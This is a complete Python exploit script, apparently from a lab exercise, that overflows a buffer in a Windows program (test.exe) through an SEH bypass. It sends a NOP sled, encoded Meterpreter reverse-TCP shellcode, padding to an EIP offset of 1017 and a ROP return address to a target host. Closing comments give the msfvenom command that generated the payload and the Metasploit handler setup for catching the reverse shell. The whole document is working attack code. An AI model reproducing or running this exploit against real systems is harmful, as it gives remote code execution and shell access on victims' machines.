#!/usr/bin/env python3
import socket
import struct
RHOST="192.168.1.233"
RPORT=4444

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

offset_eip = 1017
nops = b"\x90" * 20
shellcode =  b""
shellcode += b"\xd9\xe5\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x56\xbe"
shellcode += b"\xd0\xbb\x9d\xbf\x83\xc7\x04\x31\x77\x14\x03\x77"
shellcode += b"\xc4\x59\x68\x43\x0c\x1f\x93\xbc\xcc\x40\x1d\x59"
shellcode += b"\xfd\x40\x79\x29\xad\x70\x09\x7f\x41\xfa\x5f\x94"
shellcode += b"\xd2\x8e\x77\x9b\x53\x24\xae\x92\x64\x15\x92\xb5"
shellcode += b"\xe6\x64\xc7\x15\xd7\xa6\x1a\x57\x10\xda\xd7\x05"
shellcode += b"\xc9\x90\x4a\xba\x7e\xec\x56\x31\xcc\xe0\xde\xa6"
shellcode += b"\x84\x03\xce\x78\x9f\x5d\xd0\x7b\x4c\xd6\x59\x64"
shellcode += b"\x91\xd3\x10\x1f\x61\xaf\xa2\xc9\xb8\x50\x08\x34"
shellcode += b"\x75\xa3\x50\x70\xb1\x5c\x27\x88\xc2\xe1\x30\x4f"
shellcode += b"\xb9\x3d\xb4\x54\x19\xb5\x6e\xb1\x98\x1a\xe8\x32"
shellcode += b"\x96\xd7\x7e\x1c\xba\xe6\x53\x16\xc6\x63\x52\xf9"
shellcode += b"\x4f\x37\x71\xdd\x14\xe3\x18\x44\xf0\x42\x24\x96"
shellcode += b"\x5b\x3a\x80\xdc\x71\x2f\xb9\xbe\x1d\x9c\xf0\x40"
shellcode += b"\xdd\x8a\x83\x33\xef\x15\x38\xdc\x43\xdd\xe6\x1b"
shellcode += b"\xd2\xc9\x18\xf3\x5c\x99\xe6\xf4\x9c\xb3\x2c\xa0"
shellcode += b"\xcc\xab\x85\xc9\x87\x2b\x29\x1c\x3d\x26\xbd\x5f"
shellcode += b"\x69\x37\xb8\x08\x6b\x38\xd3\x95\xe2\xde\x83\x75"
shellcode += b"\xa4\x4e\x64\x26\x04\x3f\x0c\x2c\x8b\x60\x2c\x4f"
shellcode += b"\x46\x09\xc7\xa0\x3e\x61\x70\x58\x1b\xf9\xe1\xa5"
shellcode += b"\xb6\x87\x22\x2d\x32\x77\xec\xc6\x37\x6b\x19\xb1"
shellcode += b"\xb7\x73\xda\x54\xb7\x19\xde\xfe\xe0\xb5\xdc\x27"
shellcode += b"\xc6\x19\x1e\x02\x55\x5d\xe0\xd3\x6f\x15\xd7\x41"
shellcode += b"\xcf\x41\x18\x86\xcf\x91\x4e\xcc\xcf\xf9\x36\xb4"
shellcode += b"\x9c\x1c\x39\x61\xb1\x8c\xac\x8a\xe3\x61\x66\xe3"
shellcode += b"\x09\x5f\x40\xac\xf2\x8a\xd2\xab\x0c\x48\xfd\x13"
shellcode += b"\x64\xb2\xbd\xa3\x74\xd8\x3d\xf4\x1c\x17\x11\xfb"
shellcode += b"\xec\xd8\xb8\x54\x64\x52\x2d\x16\x15\x63\x64\xf6"
shellcode += b"\x8b\x64\x8b\x23\x3c\x1e\xe4\xd4\xbd\xdf\xec\xb0"
shellcode += b"\xbe\xdf\x10\xc7\x83\x09\x29\xbd\xc2\x89\x0e\xce"
shellcode += b"\x71\xaf\x27\x45\x79\xe3\x38\x4c"

# Bypass SEH: ROP: 0x10472ca7 :  # ADD ESP,14 # RETN    ** [test.exe] **   |   {PAGE_EXECUTE_READ}
# 0x1047dcac :  # POP EAX # POP ECX # POP EBP # POP ECX # POP EBX # RETN 0x04    ** [test.exe] **   |   {PAGE_EXECUTE_READ}
return_addr = struct.pack('<I',0x1047dcac)

buf = b""
buf += nops
buf += shellcode
buf += b"\x41" * (offset_eip - len(nops) - len(shellcode))
buf += return_addr
buf += b"\r\n"

s.send(buf)
print("Sent: %s" % (buf))

data = s.recv(1024)
print("Received: %s" % (data))
s.close()

# msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.1.65 LPORT=4445 -b \x00\x0a -f python -v shellcode
# use exploit/multi/handler
# set payload windows/meterpreter/reverse_tcp
# set lhost 192.168.1.65
# set lport 4445
# run -j